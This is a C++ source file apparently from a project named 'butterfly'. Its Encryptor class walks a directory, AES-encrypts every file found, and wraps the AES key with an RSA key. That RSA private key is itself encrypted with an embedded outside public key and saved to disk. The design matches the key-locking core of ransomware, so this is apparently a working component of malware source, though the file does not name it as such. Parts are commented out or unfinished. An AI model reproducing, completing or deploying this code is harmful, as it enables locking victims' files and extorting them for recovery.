
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySize(keySize),  _aesKeyDbFilepath(aesKeyDbFilepath),
                                                                         _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                                                         _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                                         _aesEncryptor(new aes::AESEncryptor()),
                                                                         _dirIterator(new DirectoryIterator()),
                                                                         _aesKeyDatabase(new AESKeyDatabase(_aesKeyDbFilepath))
{
    LOG_TRACE("Create class Encryptor");
}

Encryptor::~Encryptor()
{

}

void Encryptor::startWithDir(const std::string &path)
{
    encryptCPrivateRSA();

    auto files =  _dirIterator->getAllFiles(path);

    if ( _aesEncryptor->generateAESKey() )
    {
        std::string aeskey = _aesEncryptor->getAESKey();
        std::string aesiv = _aesEncryptor->getAESIv();
        butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
        butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));

        for (auto &file: files)
        {

            //_aesKeyDatabase->insertEntry(filepath, butterfly::string_to_hex(_aesEncryptor->getAESKey()), butterfly::string_to_hex(_aesEncryptor->getAESIv()));

            encryptFileWithAES(file.string());
        }
    }

    encryptAESKeyFile("AESKey.txt");

    //encryptFileWithAES(_aesKeyDbFilepath);

    //encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
    //encryptFinalAESIVWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
    /*
    if ( _aesKeyDatabase->close() )
    {
        encryptFileWithAES(_aesKeyDbFilepath);

        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
        encryptFinalAESIVWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
    }*/

}

void Encryptor::encryptCPrivateRSA()
{

    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();

    _rsaEncryptorAESIV = std::unique_ptr<rsa::RSAEncryptor>(new rsa::RSAEncryptor(cPrivateRSAStr));

    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // encrypt the CPrivateRSA.pem string
        _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size() - 1));
        // get the encrypted CPrivateRSA string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedKey();
        // save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->saveEncryptedKeyFile(CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string &data, const std::string &filename)
{

    //std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the AES Key
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), data);
        // get the encrypted AES Key string
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        // save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedKeyFile(filename, aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}
void Encryptor::encryptFinalAESIVWithRSA(const std::string &data, const std::string &filename)
{

    //std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the AES IV
        _rsaEncryptorAESIV->encrypt(_rsaEncryptorAESIV->getEvpPkey(), data);
        // get the encrypted AES IV string
        std::string aesKeyEnc = _rsaEncryptorAESIV->getEncryptedKey();
        // save the encrypted AES IV to AESIV.bin
        _rsaEncryptorAESIV->saveEncryptedKeyFile(filename, aesKeyEnc,_rsaEncryptorAESIV->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptAESKeyFile(const std::string &filepath)
{
    std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the AES Key
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), fileContent);
        // get the encrypted AES Key string
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        // save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedKeyFile("AESKey.bin", aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }
}

} // namespace hybrid

} // namespace butterfly
